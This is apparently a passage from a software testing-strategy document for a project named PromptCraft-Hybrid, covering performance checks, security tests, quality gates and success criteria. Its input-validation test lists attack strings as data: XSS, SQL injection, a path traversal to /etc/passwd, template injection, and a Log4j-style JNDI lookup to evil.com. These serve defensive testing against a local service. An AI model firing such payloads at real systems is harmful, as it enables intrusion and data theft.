def check_sla_compliance(results):
    """Check if performance meets SLA requirements"""
    compliance = {}

    for test_type, metrics in results.items():
        compliance[test_type] = {
            'response_time_sla': metrics['avg_response_time'] < 3000,  # 3s SLA
            'availability_sla': metrics['failure_rate'] < 0.01,  # 99% availability
            'throughput_sla': metrics['requests_per_second'] > 10  # 10 RPS minimum
        }

    return compliance

def generate_recommendations(results):
    """Generate performance optimization recommendations"""
    recommendations = []

    for test_type, metrics in results.items():
        if metrics['avg_response_time'] > 3000:
            recommendations.append(f"High response time in {test_type}: Consider optimizing MCP orchestration")

        if metrics['failure_rate'] > 0.01:
            recommendations.append(f"High failure rate in {test_type}: Investigate error handling and retries")

        if metrics['requests_per_second'] < 10:
            recommendations.append(f"Low throughput in {test_type}: Consider scaling or caching strategies")

    return recommendations

if __name__ == "__main__":
    analyze_performance_results()
```

## 5. Security Testing

### 5.1. Security Test Suite

```python
# tests/security/test_security.py
import pytest
import requests
import subprocess
import json
from pathlib import Path

class TestSecurityCompliance:
    """Security testing for PromptCraft-Hybrid"""

    def test_static_analysis_compliance(self):
        """Test static analysis with bandit"""
        result = subprocess.run([
            'bandit', '-r', 'src/', '-f', 'json', '-o', 'reports/bandit_report.json'
        ], capture_output=True, text=True)

        # Load results
        if Path('reports/bandit_report.json').exists():
            with open('reports/bandit_report.json', 'r') as f:
                bandit_results = json.load(f)

            # Check for high/medium severity issues
            high_issues = [issue for issue in bandit_results.get('results', [])
                          if issue.get('issue_severity') == 'HIGH']

            assert len(high_issues) == 0, f"High severity security issues found: {high_issues}"

    def test_dependency_vulnerabilities(self):
        """Test for known vulnerabilities in dependencies"""
        result = subprocess.run([
            'safety', 'check', '--json', '--output', 'reports/safety_report.json'
        ], capture_output=True, text=True)

        # Safety returns non-zero for vulnerabilities, so check output
        if Path('reports/safety_report.json').exists():
            with open('reports/safety_report.json', 'r') as f:
                safety_results = json.load(f)

            vulnerabilities = safety_results.get('vulnerabilities', [])
            critical_vulns = [v for v in vulnerabilities if v.get('severity') == 'critical']

            assert len(critical_vulns) == 0, f"Critical vulnerabilities found: {critical_vulns}"

    def test_container_security_scanning(self):
        """Test container security with trivy"""
        images = [
            'zen-mcp:latest',
            'serena-mcp:latest',
            'gradio-ui:latest'
        ]

        for image in images:
            result = subprocess.run([
                'trivy', 'image', '--format', 'json', '--output', f'reports/trivy_{image.replace(":", "_")}.json', image
            ], capture_output=True, text=True)

            # Check results
            report_file = Path(f'reports/trivy_{image.replace(":", "_")}.json')
            if report_file.exists():
                with open(report_file, 'r') as f:
                    trivy_results = json.load(f)

                # Count critical vulnerabilities
                critical_count = 0
                for result in trivy_results.get('Results', []):
                    for vuln in result.get('Vulnerabilities', []):
                        if vuln.get('Severity') == 'CRITICAL':
                            critical_count += 1

                assert critical_count == 0, f"Critical vulnerabilities in {image}: {critical_count}"

    def test_api_security_headers(self, docker_services):
        """Test security headers in API responses"""
        response = requests.get('http://localhost:3000/health')

        # Check for security headers
        headers = response.headers

        security_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block'
        }

        for header, expected_value in security_headers.items():
            assert header in headers, f"Missing security header: {header}"
            assert headers[header] == expected_value, f"Incorrect {header} value: {headers[header]}"

    def test_input_validation(self, docker_services):
        """Test input validation and sanitization"""
        # Test malicious inputs
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}"  # Log4j style injection
        ]

        for malicious_input in malicious_inputs:
            payload = {
                "query": malicious_input,
                "journey": "1"
            }

            response = requests.post(
                'http://localhost:3000/api/v1/query',
                json=payload,
                timeout=10
            )

            # Should not reflect malicious input directly
            if response.status_code == 200:
                data = response.json()
                enhanced_prompt = data.get('enhanced_prompt', '')

                # Basic XSS protection check
                assert '<script>' not in enhanced_prompt.lower()
                assert 'javascript:' not in enhanced_prompt.lower()

    def test_authentication_and_authorization(self, docker_services):
        """Test authentication and authorization controls"""
        # Test protected endpoints (if any)
        protected_endpoints = [
            '/admin',
            '/metrics',
            '/debug'
        ]

        for endpoint in protected_endpoints:
            response = requests.get(f'http://localhost:3000{endpoint}')

            # Should require authentication or return 404
            assert response.status_code in [401, 403, 404], f"Unprotected endpoint: {endpoint}"

    def test_rate_limiting(self, docker_services):
        """Test rate limiting protection"""
        # Send rapid requests to test rate limiting
        rapid_requests = []

        for i in range(100):  # Send 100 requests rapidly
            payload = {"query": f"Rate limit test {i}", "journey": "1"}
            response = requests.post(
                'http://localhost:3000/api/v1/query',
                json=payload,
                timeout=5
            )
            rapid_requests.append(response.status_code)

        # Should see some rate limiting (429 responses)
        rate_limited_count = rapid_requests.count(429)

        # Allow some requests through but expect rate limiting
        assert rate_limited_count > 10, "Rate limiting not effectively protecting against rapid requests"

    def test_error_information_disclosure(self, docker_services):
        """Test that errors don't disclose sensitive information"""
        # Test invalid JSON
        response = requests.post(
            'http://localhost:3000/api/v1/query',
            data="invalid json",
            headers={'Content-Type': 'application/json'},
            timeout=10
        )

        # Should return error but not disclose internal details
        if response.status_code >= 400:
            error_text = response.text.lower()

            # Check for information disclosure
            sensitive_terms = [
                'stack trace',
                'internal server error',
                'database connection',
                'file path',
                '/usr/local',
                '/home/',
                'password',
                'secret',
                'api_key'
            ]

            for term in sensitive_terms:
                assert term not in error_text, f"Potential information disclosure: {term}"
```

### 5.2. Security Compliance Checklist

```yaml
# tests/security/security_checklist.yml
security_compliance_checklist:
  infrastructure:
    container_security:
      - ✓ All containers run as non-root users
      - ✓ Container images scanned for vulnerabilities
      - ✓ No secrets in container images
      - ✓ Resource limits set on all containers
      - ✓ Security contexts properly configured

    network_security:
      - ✓ Internal network isolation between containers
      - ✓ No direct external access to MCP servers
      - ✓ TLS encryption for external communications
      - ✓ Firewall rules properly configured
      - ✓ Network policies implemented

  application_security:
    input_validation:
      - ✓ All user inputs validated and sanitized
      - ✓ No direct file path access from user input
      - ✓ Query parameters properly escaped
      - ✓ JSON parsing security implemented
      - ✓ File upload restrictions (if applicable)

    authentication_authorization:
      - ✓ API key authentication implemented
      - ✓ Role-based access controls
      - ✓ Session management secure
      - ✓ JWT tokens properly validated
      - ✓ Permission checks on all endpoints

    data_protection:
      - ✓ Sensitive data encrypted at rest
      - ✓ Secure key management
      - ✓ No secrets in logs
      - ✓ Data retention policies
      - ✓ Secure data transmission

  code_security:
    static_analysis:
      - ✓ Bandit security scanning passed
      - ✓ No hardcoded secrets
      - ✓ Secure coding practices followed
      - ✓ Input validation everywhere
      - ✓ Error handling doesn't expose internals

    dependency_management:
      - ✓ All dependencies scanned for vulnerabilities
      - ✓ Regular dependency updates
      - ✓ Lock files used for reproducible builds
      - ✓ No known critical vulnerabilities
      - ✓ Supply chain security verified

  operational_security:
    monitoring_logging:
      - ✓ Security events logged
      - ✓ Log integrity protected
      - ✓ Anomaly detection implemented
      - ✓ Incident response procedures
      - ✓ Regular security reviews

    deployment_security:
      - ✓ Secure CI/CD pipeline
      - ✓ Environment separation
      - ✓ Secrets management in deployment
      - ✓ Infrastructure as code secured
      - ✓ Automated security testing
```

## 6. Quality Gates & Success Criteria

### 6.1. Automated Quality Gate Pipeline

```python
# tests/quality_gates/quality_gate_runner.py
import subprocess
import json
import sys
from pathlib import Path
from dataclasses import dataclass
from typing import List, Dict, Any

@dataclass
class QualityGateResult:
    gate_name: str
    passed: bool
    score: float
    details: Dict[str, Any]
    errors: List[str]

class QualityGateRunner:
    """Automated quality gate enforcement for PromptCraft-Hybrid"""

    def __init__(self):
        self.results = []
        self.reports_dir = Path("reports")
        self.reports_dir.mkdir(exist_ok=True)

    def run_all_gates(self) -> bool:
        """Run all quality gates and return overall pass/fail"""
        gates = [
            self.test_coverage_gate,
            self.performance_gate,
            self.security_gate,
            self.code_quality_gate,
            self.integration_gate
        ]

        all_passed = True

        for gate in gates:
            try:
                result = gate()
                self.results.append(result)
                if not result.passed:
                    all_passed = False
            except Exception as e:
                self.results.append(QualityGateResult(
                    gate_name=gate.__name__,
                    passed=False,
                    score=0.0,
                    details={},
                    errors=[str(e)]
                ))
                all_passed = False

        self.generate_quality_report()
        return all_passed

    def test_coverage_gate(self) -> QualityGateResult:
        """Test coverage quality gate (80% minimum)"""
        # Run pytest with coverage
        result = subprocess.run([
            'pytest', '--cov=src', '--cov-report=json:reports/coverage.json',
            '--cov-report=html:reports/coverage_html', 'tests/unit'
        ], capture_output=True, text=True)

        if result.returncode != 0:
            return QualityGateResult(
                gate_name="test_coverage",
                passed=False,
                score=0.0,
                details={},
                errors=[f"Tests failed: {result.stderr}"]
            )

        # Parse coverage report
        coverage_file = self.reports_dir / "coverage.json"
        if coverage_file.exists():
            with open(coverage_file, 'r') as f:
                coverage_data = json.load(f)

            total_coverage = coverage_data['totals']['percent_covered']

            return QualityGateResult(
                gate_name="test_coverage",
                passed=total_coverage >= 80.0,
                score=total_coverage,
                details={
                    'total_coverage': total_coverage,
                    'lines_covered': coverage_data['totals']['covered_lines'],
                    'total_lines': coverage_data['totals']['num_statements'],
                    'missing_coverage': [
                        f for f, data in coverage_data['files'].items()
                        if data['summary']['percent_covered'] < 70
                    ]
                },
                errors=[] if total_coverage >= 80.0 else [f"Coverage {total_coverage}% below 80% threshold"]
            )

        return QualityGateResult(
            gate_name="test_coverage",
            passed=False,
            score=0.0,
            details={},
            errors=["Coverage report not found"]
        )

    def performance_gate(self) -> QualityGateResult:
        """Performance quality gate"""
        # Run lightweight performance test
        result = subprocess.run([
            'locust', '-f', 'tests/performance/locustfile.py', '--headless',
            '--users', '5', '--spawn-rate', '1', '--run-time', '60s',
            '--csv', 'reports/perf_gate'
        ], capture_output=True, text=True)

        # Analyze performance results
        stats_file = self.reports_dir / "perf_gate_stats.csv"
        if stats_file.exists():
            import pandas as pd
            df = pd.read_csv(stats_file)

            avg_response_time = df['Average Response Time'].mean()
            max_response_time = df['Max Response Time'].max()
            failure_rate = df['Failure Count'].sum() / df['Request Count'].sum()

            # Performance criteria
            performance_passed = (
                avg_response_time < 3000 and  # 3s average
                max_response_time < 10000 and  # 10s max
                failure_rate < 0.05  # 5% failure rate
            )

            return QualityGateResult(
                gate_name="performance",
                passed=performance_passed,
                score=100 - (avg_response_time / 30),  # Score based on response time
                details={
                    'avg_response_time_ms': avg_response_time,
                    'max_response_time_ms': max_response_time,
                    'failure_rate': failure_rate,
                    'total_requests': df['Request Count'].sum()
                },
                errors=[] if performance_passed else [
                    f"Performance criteria not met: avg={avg_response_time}ms, max={max_response_time}ms, failures={failure_rate}"
                ]
            )

        return QualityGateResult(
            gate_name="performance",
            passed=False,
            score=0.0,
            details={},
            errors=["Performance test results not found"]
        )

    def security_gate(self) -> QualityGateResult:
        """Security quality gate"""
        security_issues = []

        # Run bandit
        bandit_result = subprocess.run([
            'bandit', '-r', 'src/', '-f', 'json', '-o', 'reports/bandit_security.json'
        ], capture_output=True, text=True)

        # Run safety
        safety_result = subprocess.run([
            'safety', 'check', '--json', '--output', 'reports/safety_security.json'
        ], capture_output=True, text=True)

        # Analyze security results
        high_severity_issues = 0

        # Check bandit results
        bandit_file = self.reports_dir / "bandit_security.json"
        if bandit_file.exists():
            with open(bandit_file, 'r') as f:
                bandit_data = json.load(f)

            high_issues = [issue for issue in bandit_data.get('results', [])
                          if issue.get('issue_severity') == 'HIGH']
            high_severity_issues += len(high_issues)

        # Check safety results
        safety_file = self.reports_dir / "safety_security.json"
        if safety_file.exists():
            with open(safety_file, 'r') as f:
                safety_data = json.load(f)

            critical_vulns = [v for v in safety_data.get('vulnerabilities', [])
                             if v.get('severity') == 'critical']
            high_severity_issues += len(critical_vulns)

        security_passed = high_severity_issues == 0

        return QualityGateResult(
            gate_name="security",
            passed=security_passed,
            score=100 if security_passed else max(0, 100 - high_severity_issues * 20),
            details={
                'high_severity_issues': high_severity_issues,
                'bandit_completed': bandit_file.exists(),
                'safety_completed': safety_file.exists()
            },
            errors=[] if security_passed else [f"{high_severity_issues} high severity security issues found"]
        )

    def code_quality_gate(self) -> QualityGateResult:
        """Code quality gate (linting, formatting)"""
        quality_issues = []

        # Run black check
        black_result = subprocess.run(['black', '--check', '.'], capture_output=True, text=True)
        if black_result.returncode != 0:
            quality_issues.append("Code formatting issues (black)")

        # Run ruff check
        ruff_result = subprocess.run(['ruff', 'check', '.'], capture_output=True, text=True)
        if ruff_result.returncode != 0:
            quality_issues.append("Linting issues (ruff)")

        # Run mypy check
        mypy_result = subprocess.run(['mypy', 'src'], capture_output=True, text=True)
        if mypy_result.returncode != 0:
            quality_issues.append("Type checking issues (mypy)")

        quality_passed = len(quality_issues) == 0

        return QualityGateResult(
            gate_name="code_quality",
            passed=quality_passed,
            score=100 if quality_passed else max(0, 100 - len(quality_issues) * 25),
            details={
                'black_passed': black_result.returncode == 0,
                'ruff_passed': ruff_result.returncode == 0,
                'mypy_passed': mypy_result.returncode == 0,
                'issues': quality_issues
            },
            errors=quality_issues
        )

    def integration_gate(self) -> QualityGateResult:
        """Integration test quality gate"""
        # Run integration tests
        result = subprocess.run([
            'pytest', 'tests/integration', '-v', '--tb=short'
        ], capture_output=True, text=True)

        integration_passed = result.returncode == 0

        return QualityGateResult(
            gate_name="integration",
            passed=integration_passed,
            score=100 if integration_passed else 0,
            details={
                'exit_code': result.returncode,
                'stdout': result.stdout[-1000:],  # Last 1000 chars
                'stderr': result.stderr[-1000:] if result.stderr else ""
            },
            errors=[] if integration_passed else ["Integration tests failed"]
        )

    def generate_quality_report(self):
        """Generate comprehensive quality report"""
        report = {
            'overall_status': all(r.passed for r in self.results),
            'quality_score': sum(r.score for r in self.results) / len(self.results) if self.results else 0,
            'gates': [
                {
                    'name': r.gate_name,
                    'passed': r.passed,
                    'score': r.score,
                    'details': r.details,
                    'errors': r.errors
                }
                for r in self.results
            ],
            'summary': {
                'total_gates': len(self.results),
                'passed_gates': sum(1 for r in self.results if r.passed),
                'failed_gates': sum(1 for r in self.results if not r.passed)
            }
        }

        # Save report
        with open(self.reports_dir / "quality_gate_report.json", 'w') as f:
            json.dump(report, f, indent=2)

        # Print summary
        print("\nQuality Gate Report")
        print("==================")
        print(f"Overall Status: {'PASSED' if report['overall_status'] else 'FAILED'}")
        print(f"Quality Score: {report['quality_score']:.1f}/100")
        print(f"Gates Passed: {report['summary']['passed_gates']}/{report['summary']['total_gates']}")

        for gate in report['gates']:
            status = "✓" if gate['passed'] else "✗"
            print(f"  {status} {gate['name']}: {gate['score']:.1f}")
            for error in gate['errors']:
                print(f"    Error: {error}")

def main():
    """Main entry point for quality gate runner"""
    runner = QualityGateRunner()
    success = runner.run_all_gates()

    if not success:
        print("\nQuality gates failed. Deployment blocked.")
        sys.exit(1)
    else:
        print("\nAll quality gates passed. Ready for deployment.")
        sys.exit(0)

if __name__ == "__main__":
    main()
```

### 6.2. Success Criteria Matrix

```yaml
# Phase 1 Success Criteria and Acceptance Tests
success_criteria:
  performance_sla:
    journey_1_response_time:
      target: "< 3 seconds (p95)"
      measurement: "API endpoint timing"
      test: "performance/test_response_times.py"
      status: "required"

    journey_3_context_generation:
      target: "< 2 seconds"
      measurement: "IDE integration timing"
      test: "integration/test_ide_performance.py"
      status: "required"

    concurrent_user_support:
      target: "10+ simultaneous users"
      measurement: "Load testing"
      test: "performance/test_concurrent_load.py"
      status: "required"

    vector_search_performance:
      target: "< 200ms for knowledge retrieval"
      measurement: "Qdrant query timing"
      test: "integration/test_vector_performance.py"
      status: "required"

  quality_metrics:
    test_coverage:
      target: "> 80%"
      measurement: "pytest --cov"
      test: "unit test suite"
      status: "required"

    code_quality:
      target: "100% compliance"
      measurement: "black + ruff + mypy"
      test: "quality_gates/code_quality_gate"
      status: "required"

    security_compliance:
      target: "0 critical vulnerabilities"
      measurement: "bandit + safety + trivy"
      test: "security/security_test_suite"
      status: "required"

    user_satisfaction:
      target: "> 85% developer satisfaction"
      measurement: "User feedback surveys"
      test: "manual acceptance testing"
      status: "required"

  functional_requirements:
    journey_1_completion:
      target: "C.R.E.A.T.E. prompt generation"
      measurement: "Functional test validation"
      test: "integration/test_journey1_workflow"
      status: "required"

    journey_3_integration:
      target: "Claude Code CLI integration"
      measurement: "IDE integration test"
      test: "integration/test_claude_code_integration"
      status: "required"

    mcp_orchestration:
      target: "6 MCP servers coordinated"
      measurement: "Health check + workflow test"
      test: "integration/test_mcp_orchestration"
      status: "required"

    knowledge_ingestion:
      target: "Automated knowledge processing"
      measurement: "Webhook + ingestion test"
      test: "integration/test_knowledge_workflow"
      status: "required"

  scalability_requirements:
    resource_utilization:
      target: "< 40GB RAM usage"
      measurement: "Container monitoring"
      test: "performance/test_resource_limits"
      status: "required"

    horizontal_scaling:
      target: "Phase 2 ready architecture"
      measurement: "Architecture review"
      test: "manual verification"
      status: "required"

    code_reuse_achievement:
      target: "> 70% code reuse"
      measurement: "Static code analysis"
      test: "quality_gates/reuse_analysis"
      status: "required"
```

---

This comprehensive testing strategy ensures Phase 1 meets all quality, performance, and security requirements while establishing a robust foundation for Phase 2 development. The automated quality gates provide continuous validation throughout the development lifecycle.
